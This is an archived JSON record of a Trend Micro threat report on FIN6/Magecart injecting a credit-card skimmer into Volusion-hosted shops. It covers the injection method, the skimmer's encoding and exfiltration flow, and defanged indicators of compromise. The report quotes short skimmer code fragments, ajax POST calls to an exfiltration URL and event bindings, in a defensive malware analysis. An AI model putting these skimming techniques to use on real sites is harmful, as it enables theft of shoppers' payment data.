{
    "id": "42e1a3b7-a9e5-477b-a184-d01639f50935",
    "created_at": "2023-01-12T15:09:32.094392Z",
    "updated_at": "2025-03-27T02:15:18.861877Z",
    "deleted_at": null,
    "sha1_hash": "1995ea9d90d057d9aaa59af1f81473712369de77",
    "title": "2019-10-09 - FIN6 Compromised E-commerce Platform via Magecart to Inject Credit Card Skimmers Into Thousands of Online Shops",
    "authors": "",
    "file_creation_date": "2022-05-27T22:34:19Z",
    "file_modification_date": "2022-05-27T22:34:19Z",
    "file_size": 141756,
    "plain_text": "# Magecart Card Skimmers Injected Into Online Shops\n\n**blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-**\nonline-shops/\n\nOctober 10, 2019\n\n_Updated on October 14, 2019 at 2:50 AM PST to add a statement from Volusion._\n\n[We discovered that the online credit card skimming attack known as Magecart or](https://blog.trendmicro.com/trendlabs-security-intelligence/new-magecart-attack-delivered-through-compromised-advertising-supply-chain/) [E-Skimming was actively operating on](https://niccs.us-cert.gov/sites/default/files/documents/pdf/ncsam_eskimming_508.pdf?trackDocs=ncsam_eskimming_508.pdf)\n3,126 online shops. Our data shows that the attack started on September 7, 2019. All of the impacted online shops are\n[hosted on the cloud platform of the e-commerce service provider “Volusion,” one of the top e-commerce platforms in the](https://www.ecommerceceo.com/ecommerce-platforms/)\nmarket. This is actually the third time we have identified a card skimmer injected into the cloud platform of an e-commerce\n[provider. Two other businesses were already victimized this year: a campus e-commerce platform and a hotel e-](https://blog.trendmicro.com/trendlabs-security-intelligence/mirrorthief-group-uses-magecart-skimming-attack-to-hit-hundreds-of-campus-online-stores-in-us-and-canada/)\ncommerce platform. These targets are obviously appealing to cybercriminals since they are connected to multiple — in\nthis most recent case, thousands of — online shops.\n\nWe found malicious code injected into a JavaScript library provided by Volusion to their client shops. The injected code\n[loaded another JavaScript stored on a Google Storage service. The loaded script is almost a direct copy of a normal](https://cloud.google.com/storage/)\nJavaScript library but has a credit card skimmer carefully integrated. When customers submit their payment information,\nthe skimmer will copy and send the personal information and credit card details to an exfiltration server belonging to the\nattackers.\n\nOur team contacted Google and they have removed the file. The attack is currently offline. As of publication, Volusion has\n[acknowledged and](https://twitter.com/Volusion/status/1181652914340798467) [fixed the issue.](https://twitter.com/Volusion/status/1181661671674335232?s=20)\n\n[Figure. 1](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/10/Fig-1.jpg)\n\nFigure 1. Online credit card skimming attack chain\n\n[Figure. 2](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/10/Fig-2.jpg)\n\nFigure 2. Country distribution of online shop users who accessed the card skimmer (based on data from the Trend Micro™\nSmart Protection Network™ infrastructure)\n\nDuring our investigation, we found that the attackers seemed more experienced and thoughtful than many other skimmer\ngroups. They did not simply add their malicious code at the top or end of a script; instead, they carefully integrated the\ncode into the original script to be part of the execution flow of the program. The code was also written as simply as\npossible, making it difficult to be identified in a big library. Furthermore, they registered the domain of their exfiltration\nserver in a similar style to a legitimate Volusion domain.\n\n\n-----\n\n[Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been identified as](https://twitter.com/ydklijnsma/status/1167837317232377856)\n[the notorious threat actor FIN6. We found similarities in the code used in this attack and the code used in FIN6’s previous](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)\nattacks on [British Airways and](https://www.riskiq.com/blog/labs/magecart-british-airways-breach/) [Newegg.](https://www.riskiq.com/blog/labs/magecart-newegg/)\n\n**Analysis of the code injection**\n\nThe attackers injected their code into a library provided on Volusion’s e-commerce platform for their client shops. The\nscript, described by the comments on the library, includes the necessary code for the pop-out feature of the shop’s\nnavigation menu. It was also used on the shop checkout page. The script is located at:\n\nhxxps://[online shop domain]/a/j/vnav.js\n\nThe attackers didn’t just inject their code inside the library. They also integrated their code into the original function of\n[jQueryUI code to be executed with the original execution flow. They created a new object “e.widget.unbridge” right before](https://jqueryui.com/)\nthe original object “e.widget.bridge” and the malicious code is inside the new object. It’s worth noting that the attackers\neven wrote their malicious code in a similar coding style to make it look more like a part of the original source code.\n\nThe injected object will create a new script element to load another remote script stored on Google Storage.\n\n[Figure. 3](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/10/Fig-3.png)\n\nFigure 3. Malicious script injected into Volusion’s JavaScript library\n\n[Figure. 4](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/10/Fig-4.png)\n\nFigure 4. Comparison of the original Volusion script (left) and the script with injection (right); the injected malicious code is\nhighlighted\n\n**Analysis of the credit card skimmer**\n\nThe loaded remote script is on Google Storage:\n\nhxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js\n\n[Much of the code inside the script is from the library “js-cookie” version 2.2.1. However, the attackers modified it and](https://cdnjs.cloudflare.com/ajax/libs/js-cookie/2.2.1/js.cookie.js)\n[integrated a credit card skimmer into the original script. The skimmer binds at the events “mousedown” and](https://api.jquery.com/mousedown/) [“touchstart” of](https://www.w3schools.com/jsref/event_touchstart.asp)\nthe payment submit button.\n\nThis means that when victims click (from desktop) or touch (from mobile devices) the submit button, the events will be\ntriggered and the skimmer will be executed.\n\n[Figure. 5](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/10/Fig-5.png)\n\nFigure 5. Comparison of the JavaScript library injected with the skimmer (left) and the original “js-cookie” library (right)\n\nThe skimmer copies the information on the entire payment form: the victim’s name, address, phone number, email\naddress, and credit card details (the number, cardholder name, expiration month, expiration year, and CVV number).\n\nOnce the skimmer has the credit card details, it serializes the copied data into a string and encodes it with Base64. Then,\nit performs a character permutation on the encoded string to make sure it can’t be directly decoded with Base64 decoding.\n\n[The data will then be stored in sessionStorage with the key “__utmz_opt_in_out”. The next time the skimmer is loaded](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)\n(usually on the page after the payment), it will detect if there is data inside sessionStorage and it will use HTTP POST to\nsend the stolen payment information to a remote server at “hxxps[:]//volusion-cdn[.]com/analytics/beacon” for exfiltration.\n\n[Figure. 6](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/10/Fig-6.png)\n\nFigure 6. Main script of the credit card skimmer\n\n\n-----\n\nNote that the attackers used the domain volusion cdn[.]com for their exfiltration server, a similar name to Volusion s\nlegitimate server. A possible reason why the attackers stored the skimmer on Google Storage is because Volusion is also\n[running its service on the Google Cloud Platform.](https://cloud.google.com/customers/volusion/)\n\n**Evidence of Magecart or FIN6**\n\nAs previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6, also known\nas the threat actor FIN6. Here are the connections we considered:\n\nGroup 6 is known to only target top-tier victims, investing in scams where they can receive a big payoff from one\nattack. This single hack of Volusion allows them to receive credit card data from 3,126 online shops.\nFrom the previous skimming attack on the British Airways and Newegg websites, we know that Group 6 tried to\nregister the domains of the exfiltration server to be similar to the victims’ domains. In this case, the domain of the\nexfiltration server is “volusion-cdn[.]com” — very similar to the valid domain “cdn3[.]volusion[.]com” from Volusion. In\naddition, the exfiltration domains used during the British Airways, Newegg, and Volusion attacks are all registered\nthrough [Namecheap.](https://www.namecheap.com/)\nWe found that the skimmer is an improved version of the previous skimmer used in the attacks on British Airways\nand Newegg. Both old and current skimmers are written with jQuery, serialize the stolen data, and use the\njQuery.ajax function to POST data to a remote server. Although the older skimmer is much simpler compared to the\ncurrent one, it didn’t encode the stolen data or store the data in sessionStorage before the exfiltration.\n\n**Target** **Script of data exfiltration request**\n\n\nBritish\nAirways\n\n\njQuery.ajax({type:\"POST\",async:0,url:”[exfiltration url]”,data:t,dataType:\"application/json})\n\n\nNewegg jQuery.ajax({type:\"POST\",async:true,url:”[exfiltration url]”,data:pdati,dataType:\"application/json})\n\nVolusion $.ajax({type: 'POST',url: '[exfiltration url]',dataType: 'application/x-www-form-urlencoded',data: d,complete:\nfunction() { window.sessionStorage.removeItem('__utmz_opt_in_out'); }})\n\nIt’s also interesting to see that the skimmer in this attack binds to event “mousedown” and event “touchstart” of the\npayment submit button. The previous Group 6 skimmer binds to event “mouseup” and event “touchend”.\n\nThese events are different, but they are the pairs of each other that trigger the skimmer at almost the same time. It seems\nthat they want to trigger the skimmer at the same moment, but the current version binds on two opposite events of the\npairs to avoid detection from heuristic rules.\n\n**Target** **Script of event binding**\n\nBritish Airways .bind(\"mouseup touchend\", function(a) {…})\n\nNewegg .bind(\"mouseup touchend\", function(e) {…})\n\nVolusion .bind('mousedown touchstart', z)\n\nIt seems that Magecart is continuing to change and experiment with new attack methods, refining its skimmer to evade\ndetection. Sophisticated groups such as these will always try to find new ways to stay undetected in their victims’ systems.\n\n[To defend against this type of threat, website owners should regularly check and strengthen their security with patches](https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patching-problems-and-how-to-solve-them)\nand server segregation. Site owners should also employ robust authentication mechanisms, especially for those that store\n[and manage sensitive data. IT and security teams should restrict or disable outdated components and habitually monitor](https://www.trendmicro.com/vinfo/us/security/news/online-privacy/on-the-safe-side-building-better-data-protection-and-steering-clear-of-gdpr-violations)\nwebsites and applications for any indicators of suspicious activity that could lead to data exfiltration, execution of unknown\nscripts, or unauthorized access and modification.\n\n[The following Trend Micro solutions, powered by XGen™ security, protect users and businesses by blocking the scripts](http://go.trendmicro.com/sem/sem/www.trendmicro.com/us/business/xgen/index.html)\nand preventing access to the malicious domains:\n\n[Trend Micro Security](https://blog.trendmicro.com/en_us/forHome/products.html)\n[Smart Protection Suites and Worry-Free™Business Security](https://blog.trendmicro.com/en_us/business/products/user-protection/sps.html)\n\n\n-----\n\n[Trend Micro Network Defense](https://blog.trendmicro.com/en_us/business/products/hybrid-cloud.html)\n[Hybrid Cloud Security](https://www.trendmicro.com/en_us/business/products/hybrid-cloud.html)\n\nResearcher Marcel Afrahim also published a Medium post on this case.\n\n**Indicators of Compromise**\n\n**Indicator** **Attribution** **Detection name**\n\nvolusion-cdn[.]com FIN6\nexfiltration\nserver\ndomain\n\nhttps[:]//volusion-cdn[.]com/analytics/beacon FIN6\nexfiltration\nserver URL\n\nhttps[:]//storage[.]googleapis[.]com/volusionapi/resources.js FIN6 credit\ncard\nskimmer\nURL\n\n\n2348433df49e73217969a45726c53441f092c4a6fce57d1d58a6cf79d3976058 FIN6 credit\ncard\nskimmer\nhash\n\ncee25c699a14a04c6e1b6e6fcd5ce7d4414c9f324b62509a7af14ae5bf749af8 FIN6 credit\ncard\nskimmer\nhash\n\n\nd03f18a71ce059a79840a38aad4944426f0524bbd68a7a8fb7003c82996e6533\n\nA Volusion spokesperson has added the following statement:\n\n\nFIN6 credit\ncard\nskimmer\nhash\n\n\nTrojanSpy.JS.MAGECART.C\n\nTrojanSpy.JS.MAGECART.D\n\nTrojanSpy.JS.MAGECART.D\n\n\n\"Volusion was alerted of a data security incident and can confirm that it was resolved within a few hours of notification. We\nare coordinating with authorities on this matter, and continue to enhance our systems that detect and prevent unauthorized\naccess to user accounts.\n\nA limited portion of customer information was compromised from a subset of our merchants. This included credit card\ninformation, but not other associated personally identifying details. We are not aware of any fraudulent activity connected\nto this matter.\n\nVolusion has taken action to help secure accounts, and we are continuing to monitor this matter in order to assure the\nsecurity of our merchants.\"\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-10-09 - FIN6 Compromised E-commerce Platform via Magecart to Inject Credit Card Skimmers Into Thousands of Online Shops.pdf"
    ],
    "report_names": [
        "2019-10-09 - FIN6 Compromised E-commerce Platform via Magecart to Inject Credit Card Skimmers Into Thousands of Online Shops.pdf"
    ],
    "threat_actors": [
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ee3363a4-e807-4f95-97d8-b603c31b9de1",
            "created_at": "2023-01-06T13:46:38.485884Z",
            "updated_at": "2025-03-27T02:00:02.845851Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "Camouflage Tempest",
                "MageCart Group 6",
                "G0037",
                "TA4557",
                "SKELETON SPIDER",
                "ITG08",
                "White Giant",
                "GOLD FRANKLIN",
                "ATK88"
            ],
            "source_name": "MISPGALAXY:FIN6",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "12517c87-040a-4627-a3df-86ca95e5c13f",
            "created_at": "2022-10-25T16:07:23.61665Z",
            "updated_at": "2025-03-27T02:02:09.889471Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "ATK 88",
                "Camouflage Tempest",
                "FIN6",
                "Gold Franklin",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "TAG-CR2",
                "White Giant"
            ],
            "source_name": "ETDA:FIN6",
            "tools": [
                "AbaddonPOS",
                "Agentemis",
                "AmmyyRAT",
                "Anchor_DNS",
                "BlackPOS",
                "CmdSQL",
                "Cobalt Strike",
                "CobaltStrike",
                "FlawedAmmyy",
                "FrameworkPOS",
                "Grateful POS",
                "JSPSPY",
                "Kaptoxa",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LockerGoga",
                "MMon",
                "Magecart",
                "Meterpreter",
                "Mimikatz",
                "More_eggs",
                "NeverQuest",
                "POSWDS",
                "Reedum",
                "Ryuk",
                "SCRAPMINT",
                "SONE",
                "SpicyOmelette",
                "StealerOne",
                "Taurus Loader Stealer Module",
                "Terra Loader",
                "TerraStealer",
                "Vawtrak",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "cobeacon",
                "grabnew"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b3acfb48-b04d-4d3d-88a8-836d7376fa2e",
            "created_at": "2024-06-19T02:03:08.052814Z",
            "updated_at": "2025-03-27T02:05:17.368029Z",
            "deleted_at": null,
            "main_name": "GOLD FRANKLIN",
            "aliases": [
                "ITG08 ",
                "MageCart Group 6 ",
                "Skeleton Spider ",
                "White Giant ",
                "FIN6 "
            ],
            "source_name": "Secureworks:GOLD FRANKLIN",
            "tools": [
                " Metasploit",
                " Meterpreter",
                " Mimikatz",
                " PowerSploit",
                " PowerUpSQL",
                " RemCom",
                "FrameWorkPOS"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ea7bfe06-7c23-481d-b8ba-eafa6cda3bc9",
            "created_at": "2022-10-25T15:50:23.317961Z",
            "updated_at": "2025-03-27T02:00:55.440858Z",
            "deleted_at": null,
            "main_name": "FIN6",
            "aliases": [
                "FIN6",
                "Magecart Group 6",
                "ITG08",
                "Skeleton Spider",
                "TAAL",
                "Camouflage Tempest"
            ],
            "source_name": "MITRE:FIN6",
            "tools": [
                "FlawedAmmyy",
                "GrimAgent",
                "FrameworkPOS",
                "More_eggs",
                "Cobalt Strike",
                "Windows Credential Editor",
                "AdFind",
                "PsExec",
                "LockerGoga",
                "Ryuk",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "06f622cb-3a78-49cf-9a4c-a6007a69325f",
            "created_at": "2022-10-25T16:07:23.315239Z",
            "updated_at": "2025-03-27T02:02:09.733197Z",
            "deleted_at": null,
            "main_name": "APT 3",
            "aliases": [
                "APT 3",
                "Bronze Mayfair",
                "Buckeye",
                "Gothic Panda",
                "Group 6",
                "Operation Clandestine Fox",
                "Operation Clandestine Fox, Part Deux",
                "Operation Clandestine Wolf",
                "Operation Double Tap",
                "Red Sylvan",
                "TG-0110",
                "UPS Team"
            ],
            "source_name": "ETDA:APT 3",
            "tools": [
                "APT3 Keylogger",
                "Agent.dhwf",
                "BKDR_HUPIGON",
                "Backdoor.APT.CookieCutter",
                "Badey",
                "Bemstour",
                "CookieCutter",
                "Destroy RAT",
                "DestroyRAT",
                "DoublePulsar",
                "EXL",
                "EternalBlue",
                "HTran",
                "HUC Packet Transmit Tool",
                "Hupigon",
                "Hupigon RAT",
                "Kaba",
                "Korplug",
                "LaZagne",
                "MFC Huner",
                "OSInfo",
                "Pirpi",
                "PlugX",
                "RedDelta",
                "RemoteCMD",
                "SHOTPUT",
                "Sogu",
                "TIGERPLUG",
                "TTCalc",
                "TVT",
                "Thoper",
                "Xamtrav",
                "remotecmd",
                "shareip",
                "w32times"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536172,
    "ts_updated_at": 1743041718,
    "ts_creation_date": 1653690859,
    "ts_modification_date": 1653690859,
    "files": {
        "pdf": "https://archive.orkl.eu/1995ea9d90d057d9aaa59af1f81473712369de77.pdf",
        "text": "https://archive.orkl.eu/1995ea9d90d057d9aaa59af1f81473712369de77.txt",
        "img": "https://archive.orkl.eu/1995ea9d90d057d9aaa59af1f81473712369de77.jpg"
    }
}